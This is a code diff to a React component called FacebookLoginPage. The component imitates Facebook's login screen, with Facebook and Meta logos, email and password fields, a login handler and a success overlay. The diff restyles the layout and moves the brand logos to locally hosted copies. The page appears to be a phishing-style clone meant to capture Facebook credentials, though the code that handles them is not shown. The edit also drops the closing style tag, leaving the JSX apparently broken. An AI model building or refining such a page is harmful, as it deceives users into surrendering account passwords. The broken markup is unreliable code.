@@ -33,14 +33,15 @@ export default function FacebookLoginPage() {
       </Head>
 
       <style jsx>{`
-        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #e7ebf0, #f0f2f5); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background-color: white; width: 100%; max-width: 360px; padding: 20px; border-radius: 8px; box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1); text-align: center; }
-        .login-container img[alt="Facebook Logo"] { width: 50px; margin-bottom: 20px; }
+        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #e7ebf0, #f0f2f5); height: 100vh; margin: 0; overflow: hidden; }
+        .login-wrapper { position: fixed; inset: 0; display: flex; align-items: center; justify-content: flex-start; padding: 40px 0; }
+        .login-container { background-color: white; width: 360px; padding: 20px; border-radius: 8px; box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1); text-align: center; }
+        .login-container img[alt="Facebook Logo"] { width: 50px; margin-bottom: 20px; display: block; margin-left: auto; margin-right: auto; }
         .login-container input { width: 95%; padding: 12px; margin: 10px 0; border: 1px solid #ccd0d5; border-radius: 6px; background-color: #f5f6f7; font-size: 16px; }
         .login-container input:focus { outline: none; border-color: #1877f2; }
-        .login-container button#login { width: 100%; padding: 12px; margin: 15px 0; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
-        .login-container button#login:hover { background-color: #166fe5; }
-        .login-container a { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-top: 10px; }
+        #login { width: 100%; padding: 12px; margin: 15px 0; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
+        #login:hover { background-color: #166fe5; }
+        a.forgot { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-top: 10px; }
         .secondary-button { background: linear-gradient(135deg, #42b72a, #36a420); color: white; border: 2px solid #1877f2; border-radius: 6px; padding: 12px; margin-top: 15px; margin-bottom: 10px; cursor: pointer; font-size: 16px; width: 100%; }
         .secondary-button:hover { background: linear-gradient(135deg, #36a420, #2e921c); }
         .footer { margin-top: 20px; font-size: 12px; color: #555; }
@@ -57,22 +58,25 @@ export default function FacebookLoginPage() {
         @keyframes draw-check { to { stroke-dashoffset: 0; } }
         .success-box h2 { font-family: 'Segoe UI', 'Roboto', sans-serif; font-size: 26px; font-weight: 600; color: #333; margin: 0 0 12px; }
         .success-box p { font-size: 15px; color: #555; line-height: 1.55; margin: 0; }
-      `}</style>
+        @media (max-width: 480px) { .login-wrapper { justify-content: center; } .login-container { width: 90%; } }
+      `}
 
+      <div className="login-wrapper">
       <div className="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" />
+        <img src="/logos/fb-logo.svg" alt="Facebook Logo" />
         <input id="email" type="text" placeholder="Mobile number or email address" value={email} onChange={(e) => setEmail(e.target.value)} />
         <input id="password" type="password" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
         <span id="feedback" style={{color: 'red', fontFamily: 'sans-serif', fontSize: '15px', textAlign: 'center', margin: '0 30px'}}>{feedback}</span>
         <button id="login" onClick={handleLogin}>Log in</button>
-        <a href="#">Forgotten Password?</a>
+        <a className="forgot" href="#">Forgotten Password?</a>
         <button className="secondary-button" onClick={() => console.log('Create new account')}>Create new account</button>
         
         <div className="footer">
-          <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Meta Logo" />
+          <img src="/logos/meta-logo.png" alt="Meta Logo" />
           <p><a href="#">About</a> · <a href="#">Help</a> · <a href="#">More</a></p>
         </div>
       </div>
+    </div>
 
       <div className="success-overlay" id="successOverlay" aria-hidden="true">
         <div className="success-box">
